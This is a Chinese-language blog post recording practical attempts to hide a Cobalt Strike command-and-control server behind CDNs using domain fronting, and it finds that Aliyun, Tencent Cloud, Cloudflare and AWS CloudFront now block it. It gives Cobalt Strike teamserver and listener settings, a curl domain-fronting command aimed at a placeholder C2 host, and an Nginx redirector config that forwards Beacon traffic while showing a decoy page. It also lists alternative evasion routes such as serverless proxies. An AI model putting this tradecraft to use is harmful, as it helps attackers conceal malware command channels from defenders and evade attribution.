---
layout: about
category: about
toc: true
wrench: 2022-02-23
Researchname: 域名前置隐藏C2服务器
desc: 「Cobalt Strike」
author: Bin4xin
permalink: /about/Cobalt-Strike-C2-domain-front-hidden/
description: Domain Fronting技术原理与Cobalt Strike C2隐藏实战踩坑记录
---

# 域名前置（Domain Fronting）隐藏C2服务器

> 在前文中我们已经通过CDN接入的方式实现了C2服务器IP的初步隐藏，但流量分析层面仍存在被溯源的风险。本文尝试使用**域名前置（Domain Fronting）**技术进一步隐藏C2通信流量，然而实践中发现国内主流云厂商已收紧CDN域名验证策略，记录踩坑过程以供后续参考。

## 1x00 什么是域名前置

域名前置（Domain Fronting）是一种基于HTTPS通信的域前置技术，核心原理是在TLS握手（SNI字段）和HTTP请求（Host头）中使用**不同的域名**：

```
TLS ClientHello → SNI: legitimate.com    (对CDN/中间人可见)
HTTP Request    → Host: malicious.com     (对CDN/中间人加密在TLS内)
```

```
┌──────────┐      ┌───────────┐      ┌────────────────┐
│  Target  │─────▶│   CDN     │─────▶│   C2 Server    │
│  (Beacon)│      │ (Edge IP) │      │  (Origin IP)   │
└──────────┘      └───────────┘      └────────────────┘
  SNI: cdn.com       解析SNI:           收到Host:
  Host: evil.com      legitimate.com    evil.com
```

- SNI（Server Name Indication）在TLS握手阶段以**明文**传输，用于CDN选择证书
- HTTP Host头被TLS加密保护，CDN边缘节点解密后根据Host头进行请求路由
- 安全设备通常只能看到SNI字段中的合法域名，从而实现流量伪装

> 简单来说：**SNI里放一个合法域名骗过流量检测，Host头里放真正的C2域名让CDN正确转发流量。**

## 1x01 前置条件

- 一台VPS用于部署Cobalt Strike Teamserver
- 一个已备案域名（国内CDN需要）
- CDN服务提供商
- Cobalt Strike 4.x

## 1x02 实践踩坑

### 尝试一：阿里云CDN

阿里云CDN添加加速域名时，需要对域名进行**归属权验证**：

实际操作中，域名验证页面一直处于转圈状态，无法完成验证流程：

> 阿里云CDN域名验证一直转圈，疑似对未备案/非主域名的验证接口存在问题。

### 尝试二：腾讯云CDN

腾讯云CDN同样要求域名验证，并且：

- 需要在DNS中添加TXT记录或CNAME记录进行验证
- 加速域名需要完成ICP备案
- 经过验证后，**成功配置了CDN加速**，但Cobalt Strike Beacon**无法上线**

排查发现腾讯云CDN对回源请求的Host头进行了额外校验，Domain Fronting的双域名策略在该场景下被拦截。

### 尝试三：Cloudflare（推荐）

Cloudflare的做法相对宽松，不需要域名验证：

1. 将域名NS指向Cloudflare
2. 添加A记录指向VPS真实IP
3. 开启CDN代理（橙色云朵）

```
DNS A Record:
  cdn.example.com → 1.2.3.4 (VPS真实IP, Proxied: ON)
```

Cobalt Strike Listener配置：

```bash
# teamserver启动
./teamserver <vps_ip> <password> <c2profile>

# Listeners配置
Beacon HTTP:
  Host(s): cdn.example.com
  Port(s): 80, 8080, 8880, 2052, 2082, 2086, 2095

Beacon HTTPS:
  Host(s): cdn.example.com
  Port(s): 443, 2053, 2083, 2087, 2096, 8443
```

> **Cloudflare支持的HTTP端口：** `80, 8080, 8880, 2052, 2082, 2086, 2095`
>
> **Cloudflare支持的HTTPS端口：** `443, 2053, 2083, 2087, 2096, 8443`

但Cloudflare存在一个关键限制：**SNI与Host不一致时，Cloudflare边缘节点会拒绝转发请求**。这意味着在Cloudflare上做传统Domain Fronting是行不通的，实际上只是实现了CDN接入隐藏真实IP。

### 尝试四：CloudFront（AWS）

Amazon CloudFront是早期Domain Fronting实践的主要目标：

```bash
# 创建CloudFront Distribution
# Origin Domain: <your-c2-domain>
# Alternate Domain Names (CNAME): <legitimate-high-reputation-domain>

# 域名前置示例
curl -H "Host: your-c2.com" https://legitimate-high-reputation-cdn.com/beacon
```

但自2018年起，AWS已明确禁止CloudFront上的Domain Fronting：

> "CloudFront现在拒绝SNI与Host头不匹配的请求。" —— AWS Blog, 2018

## 1x03 国内现状总结

{: .table}
| CDN提供商 | 域名验证 | Domain Fronting | 备注 |
|-----------|---------|-----------------|------|
| 阿里云CDN | ✅ 必须 | ❌ 不可行 | 验证流程存在问题 |
| 腾讯云CDN | ✅ 必须 | ❌ 不可行 | Host头校验严格 |
| Cloudflare | ❌ 不需要 | ❌ 不可行 | SNI/Host一致性校验 |
| AWS CloudFront | ✅ 必须 | ❌ 已禁用 | 2018年后明确禁止 |

当前各家CDN服务提供商均收紧了域名验证策略：

- **国内云厂商**（阿里云、腾讯云）：强制要求域名验证+ICP备案
- **国际云厂商**（AWS、Azure、GCP）：已明确禁止Domain Fronting
- **Cloudflare**：不要求域名验证，但SNI/Host一致性校验阻止了Domain Fronting

> **结论：** 2022年之后，传统意义上的Domain Fronting在国内主流CDN上基本不可行。CDN接入仍可实现真实IP隐藏，但Domain Fronting的流量伪装能力已大幅削弱。

## 1x04 替代方案

面对Domain Fronting被封堵的现状，可考虑以下替代思路：

1. **合法域名+CDN接入**：使用自己备案的域名接入CDN，隐藏VPS真实IP，流量层面显示为合法域名通信
2. **域前置变体（Domain Borrowing）**：利用同CDN账号下的其他域名进行请求路由，绕过SNI/Host一致性检查
3. **重定向器（Redirector）**：在CDN后端部署Nginx/Apache重定向器，根据User-Agent/URI路径过滤并转发合法Beacon流量
4. **云函数（Serverless）**：使用云函数作为中间层代理转发Beacon流量，C2域名指向云函数入口

```bash
# Nginx重定向器示例
server {
    listen 443 ssl;
    server_name cdn.example.com;

    ssl_certificate     /etc/nginx/ssl/cdn.example.com.crt;
    ssl_certificate_key /etc/nginx/ssl/cdn.example.com.key;

    location / {
        proxy_pass https://c2-server-real-ip:443;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
    }

    # 仅转发合法Beacon请求
    location ~ ^/submit.php$ {
        proxy_pass https://c2-server-real-ip:443;
    }

    # 其余请求返回正常页面
    location / {
        return 200 "Hello World";
    }
}
```

## 1x05 后续

本文作为Domain Fronting技术的踩坑记录，核心结论是：

1. **国内CDN服务均已收紧域名验证策略**，Domain Fronting的实施门槛大幅提高
2. **主流国际云厂商已明确禁止Domain Fronting**，技术红利期已过
3. **CDN接入隐藏真实IP** 仍然是可行的，但仅限于IP层面的隐藏
4. 后续将单独记录 **重定向器+CDN** 的组合方案实现流量过滤与C2隐藏

> 参考前文：[Cobalt Strike服务器隐藏真实IP](/about/Cobalt-Stike-hidden-true-ip/) ｜ [CS上线木马免杀入门](/about/Cobalt-Strike-beacon-bypass-walkthrough/)

# REF

- [基于国内某云的 Domain Fronting 技术实践](https://www.anquanke.com/post/id/195011#h2-2){:target="_blank"}
- [域前置技术的原理与CS上的实现](https://blog.csdn.net/qq_41874930/article/details/107742843){:target="_blank"}
- [Domain Fronting Is Dead, Long Live Domain Fronting](https://www.fireeye.com/blog/threat-research/2019/04/domain-fronting-is-dead-long-live-domain-fronting.html){:target="_blank"}
- [Blocking-resistant communication through domain fronting](https://www.bamsoftware.com/papers/fronting/){:target="_blank"}
- [反溯源-cs和msf域名上线](https://xz.aliyun.com/t/5728){:target="_blank"}
- [红队基础建设:隐藏你的C2 server](https://xz.aliyun.com/t/4509){:target="_blank"}
- [检测与隐藏Cobaltstrike服务器/#CDN](https://hosch3n.github.io/2020/12/16/%E6%A3%80%E6%B5%8B%E4%B8%8E%E9%9A%90%E8%97%8FCobaltstrike%E6%9C%8D%E5%8A%A1%E5%99%A8/#CDN){:target="_blank"}